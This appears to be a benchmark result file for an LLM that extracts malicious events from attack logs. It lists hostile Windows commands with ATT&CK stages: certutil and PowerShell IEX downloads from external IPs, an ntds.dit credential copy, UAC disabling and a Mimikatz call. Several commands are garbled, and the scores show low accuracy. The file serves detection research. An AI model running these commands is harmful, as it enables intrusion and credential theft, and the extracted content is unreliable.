@@ -1,0 +1,116 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8084 ",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "esentutl.exe  /y /vss c: windows ntidsntds.dit /d c: ntds.dit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u0161\u02dc\u2026\u00a3\u2019\u0411.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\", \u201cstage\u201d:\u201dPrivilege Escalation\u201d}",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /c \"arp -a\" ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119 \" ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\" ",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \u201eInvoke- AtomicTest t1547.001 -TestNumbers 1\u201c",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add HKLM SOFTWARE Microsoft Windows CurrentVersion Policies System /v EnableLUA /t REG DWORD /d 0 /f ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy Item \u201a.\t1059.003 script bat\u2018 \u201ec: Windows Temp\t1059.003 script bat\u201c ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \u201eStart Process $ env TEMP T1059.003 script.bat\u201c ",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C mkdir timestomp ; echo ip config /all > timestomp/timestomp.txt ; (ls timestomp). LastWrite Time= 2020-10-10 12:12:12 ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "import module ./ Invoke PS Image ps1; Invoke PS image Script./ Invoke Mimikatz ps1-Out./ evil kiwi png-Image./ 995647 jpg ",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C IEX ((new object net web client). download string('http://185.199.109.133/payload\u2019)",
+        "stage": "Initial Access"
+      }
+    ],
+    "narrative": "An attacker has executed an initial access attack using certutil.exe to obtain malicious resources over HTTP and Powershell scripts have been downloaded from Internet with bypassing execution policy restrictions. Scripts were run within system environments via powershell commands. Attacker also accessed credential files through 'esentutl.exe'. Attacker further escalated privileges through exploits like Invoke Atomic tests such as T1134.001. Network reconnaissance was done to identify potential targets via ARP protocol discovery and DNS queries. Multiple persistence techniques involved via registry modifications through cmd executables.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 77981,
+      "completion_tokens": 2324,
+      "total_tokens": 80305,
+      "wall_clock_s": 71.561,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.3125,
+      "recall": 0.13513513513513514,
+      "f1": 0.18867924528301885,
+      "tp": 5,
+      "fp": 11,
+      "fn": 32
+    },
+    "stage": {
+      "precision": 0.25,
+      "recall": 0.10810810810810811,
+      "f1": 0.1509433962264151,
+      "tp": 4,
+      "fp": 12,
+      "fn": 33,
+      "recall_partial": 0.12162162162162163
+    },
+    "hallucination_rate": 0.18181818181818182,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 77981,
+      "completion_tokens": 2324,
+      "total_tokens": 80305,
+      "wall_clock_s": 71.561,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
